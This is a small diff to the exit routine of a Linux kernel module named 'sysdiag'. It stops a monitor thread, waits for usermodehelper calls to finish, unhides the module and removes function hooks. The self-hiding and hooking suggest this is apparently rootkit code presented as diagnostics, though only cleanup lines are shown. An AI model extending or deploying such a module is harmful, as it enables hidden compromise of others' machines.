@@ -55,10 +55,13 @@ static int __init sysdiag_init(void)
 
 static void __exit sysdiag_exit(void)
 {
-    if (mon_it)
+    if (mon_it) {
         kthread_stop(mon_it);
+        mon_it = NULL;
+        msleep(100);          /* drain: let any in-flight usermodehelper unwind */
+    }
 
-    if (hidden)          
+    if (hidden)
         showme();
 
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
